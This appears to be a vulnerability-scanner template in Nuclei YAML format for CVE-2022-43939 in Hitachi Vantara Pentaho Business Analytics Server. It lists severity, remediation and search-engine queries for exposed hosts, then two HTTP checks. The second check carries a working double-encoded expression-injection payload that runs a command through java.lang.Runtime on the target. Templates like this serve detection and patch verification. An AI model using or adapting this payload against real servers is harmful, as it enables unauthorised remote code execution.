id: CVE-2022-43939

info:
  name: Hitachi Vantara Pentaho Business Analytics Server - Auth Bypass & RCE
  author: ProjectDiscoveryAI (updated by Ostorlab)
  severity: critical
  description: |
    Hitachi Vantaraâ€™s Pentaho Business Analytics Server versions prior to 9.4.0.1, 9.3.0.2, and all 8.3.x are vulnerable due to improper handling of non-canonical URL paths during authorization decisions.
    This flaw, which is actively exploited in the wild, allows attackers not only to bypass security restrictions but, when chained with CVE-2022-43769, to execute arbitrary commands (RCE) on the server.
  impact: |
    Exploitation may result in:
      - Unauthorized access via authentication bypass.
      - Remote Code Execution when chained with CVE-2022-43769.
      - Potential complete system compromise.
  remediation: |
    - Upgrade to Pentaho Business Analytics Server version 9.4.0.1 or later.
    - Implement restrictive authorization filters to further mitigate risks.
    - Monitor for indicators of compromise given active exploitation.
  reference:
    - https://research.aurainfosec.io/pentest/pentah0wnage/
    - https://www.tenable.com/plugins/was/114248
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H
    cvss-score: 8.6
    cve-id: CVE-2022-43939
    cwe-id: CWE-647,NVD-CWE-noinfo
    epss-score: 0.00315
    epss-percentile: 0.71059
    cpe: cpe:2.3:a:hitachi:vantara_pentaho_business_analytics_server:*:*:*:*:*:*:*:*
  metadata:
    vendor: hitachi
    product: vantara_pentaho_business_analytics_server
    shodan-query: http.favicon.hash:1749354953
    fofa-query: icon_hash=1749354953

variables:
  random_int: '{{rand_int(1,1000)}}'

http:
  # Original endpoint check for non-canonical URL bypass
  - method: GET
    path:
      - "{{BaseURL}}/pentaho/api/repos/:public:/:"
      - "{{BaseURL}}/pentaho/api/repos/%3Apublic%3A/%3A"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Pentaho"
        part: body

  # Vulnerability check: Uses a double-encoded payload with a random integer to bypass URL parser restrictions.
  - method: GET
    path:
      - "{{BaseURL}}/pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%2523%257BT%2528java.lang.Runtime%2529.getRuntime().exec(%2527echo%2520{{random_int}}%2527)%257D&mgrDn=a&pwd=a"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{random_int}}"
        part: body
